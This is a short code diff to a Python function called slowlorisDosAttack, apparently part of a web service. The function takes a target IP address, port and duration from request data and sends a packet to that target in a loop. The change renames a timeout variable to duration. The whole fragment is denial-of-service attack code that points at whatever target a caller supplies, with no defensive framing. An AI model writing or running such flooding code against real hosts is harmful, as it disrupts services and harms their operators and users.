@@ -15,7 +15,7 @@ def slowlorisDosAttack():
     ipAddress = data["ipAddress"]
     portNumber = int(data["portNumber"])
     # type = data["type"]
-    timeout = int(data["timeout"])
+    duration = int(data["duration"])
 
     # ip = ipAddress
     # port = int(portNumber)
@@ -32,7 +32,7 @@ def slowlorisDosAttack():
     start_time = time.time()
 
     # Send the constructed packet in a loop for 60 seconds
-    while time.time() - start_time < timeout:
+    while time.time() - start_time < duration:
         send(p, verbose=0)
 
     return "hi"
